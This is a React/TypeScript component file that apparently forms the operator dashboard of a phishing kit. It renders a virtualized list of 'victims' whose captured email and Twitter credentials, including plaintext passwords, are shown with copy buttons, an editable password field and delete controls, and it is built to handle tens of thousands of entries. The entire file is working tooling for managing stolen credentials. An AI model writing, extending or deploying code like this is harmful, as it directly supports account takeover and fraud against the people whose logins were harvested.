import { memo, useCallback, useMemo, useRef, useState } from 'react';
import { Check, Copy, Trash2 } from 'lucide-react';
import { getInitials } from '../lib/capturedStore';
import type { CapturedCredential } from '../lib/types';

const ROW_H = 148;
const OVERSCAN = 6;

const AVATAR_GRADIENTS = [
  'from-violet-500 to-fuchsia-500',
  'from-cyan-400 to-blue-600',
  'from-rose-400 to-orange-500',
  'from-emerald-400 to-teal-600',
  'from-amber-400 to-pink-500',
  'from-indigo-400 to-purple-600',
];

function gradientFor(id: string) {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h + id.charCodeAt(i) * 17) % AVATAR_GRADIENTS.length;
  return AVATAR_GRADIENTS[h];
}

function displayNameOf(row: CapturedCredential, tab: 'email' | 'twitter') {
  if (row.name && row.name !== 'Email User' && row.name !== 'Twitter User') return row.name;
  if (row.username) return row.username;
  return tab === 'twitter' ? 'Twitter User' : 'Email User';
}

type Props = {
  rows: CapturedCredential[];
  tab: 'email' | 'twitter';
  onDelete: (id: string) => void;
  onPasswordChange: (id: string, password: string) => void;
};

const VictimRow = memo(function VictimRow({
  row,
  index,
  tab,
  style,
  onDelete,
  onPasswordChange,
}: {
  row: CapturedCredential;
  index: number;
  tab: 'email' | 'twitter';
  style: React.CSSProperties;
  onDelete: (id: string) => void;
  onPasswordChange: (id: string, password: string) => void;
}) {
  const [copied, setCopied] = useState<string | null>(null);
  const displayName = displayNameOf(row, tab);
  const initials = getInitials(row.email, row.name);
  const grad = gradientFor(row.id || row.email);

  const copyText = async (key: string, text: string) => {
    try {
      await navigator.clipboard.writeText(text || '');
      setCopied(key);
      window.setTimeout(() => setCopied(null), 1000);
    } catch {
      /* ignore */
    }
  };

  return (
    <div style={style} className="px-3 sm:px-4 pb-2.5 box-border">
      <div className="glass-panel p-3 h-[calc(100%-0.625rem)]">
        <div className="flex gap-3 items-start h-full">
          <div
            className={`h-14 w-14 shrink-0 rounded-full overflow-hidden bg-gradient-to-br ${grad} grid place-items-center text-white font-bold text-base shadow-lg border-2 border-white/25`}
          >
            {row.avatar ? (
              <img
                src={row.avatar}
                alt={displayName}
                className="h-full w-full rounded-full object-cover"
                loading="lazy"
                draggable={false}
              />
            ) : (
              <span>{initials}</span>
            )}
          </div>

          <div className="flex-1 min-w-0">
            <div className="flex items-start gap-2 mb-1.5">
              <div className="min-w-0 flex-1">
                <p className="text-base font-bold text-white truncate leading-tight">
                  {displayName}
                </p>
                {tab === 'twitter' && row.username && (
                  <p className="text-xs text-sky-300/90 truncate">@{row.username}</p>
                )}
                <p className="text-[10px] text-white/35 mt-0.5">
                  #{row.seq || index + 1} · {new Date(row.createdAt).toLocaleString()}
                </p>
              </div>
              <button
                type="button"
                onClick={() => onDelete(row.id)}
                className="shrink-0 h-9 w-9 rounded-xl border border-rose-400/30 bg-rose-500/15 text-rose-300 grid place-items-center"
                title="Delete"
                aria-label="Delete"
              >
                <Trash2 className="h-4 w-4" />
              </button>
            </div>

            <div className="flex items-center gap-2 mb-1 rounded-xl bg-black/25 border border-white/8 px-2 py-1.5">
              <span className="text-sm">📧</span>
              <span className="flex-1 text-sm text-white/90 truncate admin-copyable font-medium">
                {row.email}
              </span>
              <button
                type="button"
                className="shrink-0 h-7 w-7 rounded-lg border border-white/15 bg-white/8 grid place-items-center"
                onClick={() => copyText(`${row.id}-e`, row.email)}
              >
                {copied === `${row.id}-e` ? (
                  <Check className="h-3.5 w-3.5 text-emerald-300" />
                ) : (
                  <Copy className="h-3.5 w-3.5" />
                )}
              </button>
            </div>

            <div className="flex items-center gap-2 rounded-xl bg-black/25 border border-white/8 px-2 py-1.5">
              <span className="text-sm">🔑</span>
              <input
                className="flex-1 bg-transparent text-sm text-emerald-300 font-mono outline-none admin-copyable min-w-0"
                value={row.password}
                onChange={(e) => onPasswordChange(row.id, e.target.value)}
              />
              <button
                type="button"
                className="shrink-0 h-7 w-7 rounded-lg border border-white/15 bg-white/8 grid place-items-center"
                onClick={() => copyText(`${row.id}-p`, row.password)}
              >
                {copied === `${row.id}-p` ? (
                  <Check className="h-3.5 w-3.5 text-emerald-300" />
                ) : (
                  <Copy className="h-3.5 w-3.5" />
                )}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
});

/** Windowed list — only mounts ~20 DOM rows even at 20,000 entries */
export default function VirtualVictimList({
  rows,
  tab,
  onDelete,
  onPasswordChange,
}: Props) {
  const parentRef = useRef<HTMLDivElement>(null);
  const [scrollTop, setScrollTop] = useState(0);
  const [viewportH, setViewportH] = useState(600);

  const onScroll = useCallback((e: React.UIEvent<HTMLDivElement>) => {
    setScrollTop(e.currentTarget.scrollTop);
  }, []);

  const onResize = useCallback((node: HTMLDivElement | null) => {
    parentRef.current = node;
    if (!node) return;
    const ro = new ResizeObserver(() => {
      setViewportH(node.clientHeight || 600);
    });
    ro.observe(node);
    setViewportH(node.clientHeight || 600);
    (node as HTMLDivElement & { __ro?: ResizeObserver }).__ro = ro;
  }, []);

  const total = rows.length;
  const start = Math.max(0, Math.floor(scrollTop / ROW_H) - OVERSCAN);
  const visibleCount = Math.ceil(viewportH / ROW_H) + OVERSCAN * 2;
  const end = Math.min(total, start + visibleCount);
  const slice = useMemo(() => rows.slice(start, end), [rows, start, end]);
  const offsetY = start * ROW_H;

  if (total === 0) {
    return (
      <div className="glass-panel m-3 p-10 text-center text-sm text-white/40">
        No users captured yet.
      </div>
    );
  }

  return (
    <div
      ref={onResize}
      onScroll={onScroll}
      className="flex-1 overflow-auto overscroll-contain"
      style={{ WebkitOverflowScrolling: 'touch' }}
    >
      <div style={{ height: total * ROW_H, position: 'relative' }}>
        <div style={{ transform: `translateY(${offsetY}px)` }}>
          {slice.map((row, i) => (
            <VictimRow
              key={row.id}
              row={row}
              index={start + i}
              tab={tab}
              style={{ height: ROW_H }}
              onDelete={onDelete}
              onPasswordChange={onPasswordChange}
            />
          ))}
        </div>
      </div>
    </div>
  );
}


